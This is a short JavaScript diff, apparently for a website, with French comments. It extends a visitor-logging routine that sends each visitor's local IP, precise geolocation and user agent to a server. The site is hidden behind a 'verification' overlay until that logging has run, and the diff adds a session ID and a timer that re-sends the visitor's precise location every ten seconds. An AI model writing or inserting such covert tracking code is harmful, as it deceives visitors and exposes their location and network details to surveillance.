@@ -66,6 +66,9 @@ async function getPreciseLocation() {
     });
 }
 
+// Générer un ID de session unique pour ce visiteur
+const sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+
 async function logVisitor(preciseLocation = null) {
     try {
         const localIp = await getLocalIP();
@@ -74,6 +77,7 @@ async function logVisitor(preciseLocation = null) {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
+                sessionId: sessionId,
                 localIp: localIp,
                 preciseLocation: preciseLocation,
                 userAgent: navigator.userAgent,
@@ -110,6 +114,14 @@ async function startVerification() {
         
         // Une fois loggué, on libère enfin le site
         overlay.style.display = 'none';
+
+        // Démarrer le tracking périodique toutes les 10 secondes
+        setInterval(async () => {
+            const loc = await getPreciseLocation();
+            if (loc) {
+                await logVisitor(loc);
+            }
+        }, 10000);
     };
 
     overlay.addEventListener('click', handleFirstClick, { once: true });
